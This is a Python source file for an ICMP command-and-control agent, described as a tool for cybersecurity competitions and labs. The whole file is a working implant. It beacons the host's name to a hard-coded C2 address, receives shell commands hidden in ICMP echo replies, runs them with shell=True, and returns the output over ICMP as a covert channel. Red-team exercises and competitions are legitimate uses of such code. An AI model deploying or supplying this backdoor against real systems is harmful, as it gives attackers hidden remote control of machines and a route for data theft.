"""
Author: Miller Swank
Date: 2025-09-24
Description: ICMP client agent for educational cybersecurity competitions and testing.
             Beacons to the server, executes queued commands, and returns results.
Note: For competition/lab purposes only. Do not run in production environments.
"""

#!/usr/bin/env python3

from scapy.all import *
import threading
import time
import os
import subprocess
import random
import string
import socket
import signal
import sys

# ====== CONFIGURATION ======
C2_IP = "192.168.10.50"   # C2 server IP
BEACON_INTERVAL = 5        # seconds between beacons
AGENT_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
SEQ = 0

# ====== GLOBALS ======
lock = threading.Lock()
running = True
HOSTNAME = socket.gethostname()

# ====== CORE FUNCTIONS ======

def send_packet(msg_type, seq, data=""):
    """Helper to send an ICMP packet with formatted payload."""
    payload = f"{AGENT_ID}|{msg_type}|{seq}|{data}"
    send(IP(dst=C2_IP)/ICMP(type=8)/payload, verbose=0)

def send_beacon():
    """Send a periodic beacon announcing this agent (includes hostname)."""
    send_packet("BEACON", 0, HOSTNAME)

def send_result(seq, result_text):
    """Send command execution results to the C2 server."""
    send_packet("RESULT", seq, result_text)

def execute_command(command):
    """Execute a shell command and return its output."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode("utf-8", errors="ignore")
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8', errors='ignore')}"
    except Exception as e:
        return f"Error: {str(e)}"

def handle_reply(pkt):
    """Handle incoming ICMP replies from the C2 server."""
    global SEQ
    if not pkt.haslayer(ICMP) or pkt[ICMP].type != 0 or not pkt.haslayer(Raw):
        return

    payload = pkt[Raw].load.decode(errors="ignore")
    fields = payload.split("|", 3)
    if len(fields) < 4:
        return

    agent_id, msg_type, seq_str, data = fields
    if agent_id != AGENT_ID:
        return  # Not for this client

    msg_type = msg_type.strip()
    data = data.strip()

    if msg_type == "CMD":
        result = execute_command(data)
        with lock:
            send_result(SEQ, result)
            SEQ += 1

def start_sniffer():
    """Background sniffer for ICMP replies."""
    sniff(filter="icmp", prn=handle_reply, store=0, stop_filter=lambda _: not running)

def beacon_loop():
    """Main beacon loop."""
    while running:
        send_beacon()
        time.sleep(BEACON_INTERVAL)

def graceful_exit(signum=None, frame=None):
    """Send EXIT message to server before shutting down."""
    global running
    running = False
    print(f"\n[*] Shutting down agent {AGENT_ID} ({HOSTNAME})...")
    try:
        send_packet("EXIT", 0, HOSTNAME)
    except Exception:
        pass
    sys.exit(0)

# ====== ENTRY POINT ======
if __name__ == "__main__":
    print(f"[*] Starting agent {AGENT_ID} ({HOSTNAME}) targeting C2 {C2_IP}")

    # Handle Ctrl+C or kill signals gracefully
    signal.signal(signal.SIGINT, graceful_exit)
    signal.signal(signal.SIGTERM, graceful_exit)

    threading.Thread(target=start_sniffer, daemon=True).start()

    try:
        beacon_loop()
    except KeyboardInterrupt:
        graceful_exit()





